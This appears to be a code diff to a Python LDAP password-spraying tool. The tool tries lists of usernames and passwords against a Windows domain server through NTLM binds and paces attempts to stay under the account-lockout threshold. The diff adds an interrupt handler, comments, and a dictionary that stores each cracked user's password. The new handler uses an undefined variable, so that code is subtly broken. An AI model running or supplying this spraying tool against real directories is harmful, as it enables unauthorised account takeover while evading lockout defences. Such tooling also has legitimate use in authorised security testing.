@@ -2,6 +2,8 @@ from ldap3 import Server, Connection, ALL, NTLM
 import logging, argparse
 from colorama import Fore, Back, init
 from time import sleep, asctime, localtime
+import signal
+import sys
 
 # Auto-reset Colorama colors
 init(autoreset=True)
@@ -20,11 +22,13 @@ parser.add_argument("-v","--verbose", help="List all authentication attempts", a
 parser.add_argument("--debug", help="Debug activity", action="store_true")
 args = parser.parse_args()
 
+# Check if we're debugging and to display or not
 if not args.debug:
     logging.disable(logging.DEBUG)
 
 logging.debug('Stating program')
 
+# Function to read a file and return each line as an item in a list
 def loadContents(file):
     with open(file) as f:
         readList = f.readlines()
@@ -32,22 +36,36 @@ def loadContents(file):
     logging.debug(f'Reading the {file} as values {clean}')
     return clean
 
+# Attempt to authenticate on LDAP
 def authAttempt(server, domain, user, passwd):
     s = Server(server, get_info=ALL)
     c = Connection(s, user=f'{domain}\{user}', password=passwd)
     t = localtime()
+    # Check if there was a successful bind
     if not c.bind():
         if c.result["description"] == "invalidCredentials":
             if args.verbose:
                 print(f'[{asctime(t)}]-' + Fore.RED + f"[-] Bad credentials for user {domain}\{user}:{passwd}")
-        else:
+        else:  # Something silly happened
             print(f'[{asctime(t)}]-' + Fore.RED + f'[-] Error in bind: {c.result["description"]}')
         return False
-    else:
+    else:  # Was a successful connection
         a = c.extend.standard.who_am_i()
         if a:
             print(f'[{asctime(t)}]-' + Fore.GREEN + f'[+] Authenticated as {a}:{c.extend.microsoft._connection.password}')
             return True
+
+# Gracefully handle CTRL-C within the program, allow users to change mind
+def signal_handler(signal, frame):
+    print('')
+    ans = input(f'[{asctime(t)}]-' + Fore.RED + f'[!] CTRL-C detected, do you want to quit? (Y/N) > ' + Fore.RESET)
+    if ans.lower() == 'y':
+        print(f'[{asctime(t)}]-' + Fore.RED + f'[!] Quitting!' + Fore.RESET)
+        sys.exit(0)
+    else:
+        print(f'[{asctime(t)}]-' + Fore.CYAN + f'[+] Continuing...' + Fore.RESET)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 logging.debug('Gathering list of users')
 users = loadContents(args.Users)
@@ -76,6 +94,7 @@ if ans != totalAttacks:
 
 atmptCount = 0
 successfulUsers = []
+successDict = {}
 
 logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')
 
@@ -88,6 +107,7 @@ for pwd in passwords:
             continue
         if authAttempt(args.Server, args.Domain, user, pwd) == True:
             logging.debug(f'Successful authentication. Adding username {user} to successfulUsers list')
+            successDict[user] = pwd
             successfulUsers.append(user)
     atmptCount += 1
     if atmptCount >= args.Lockout:
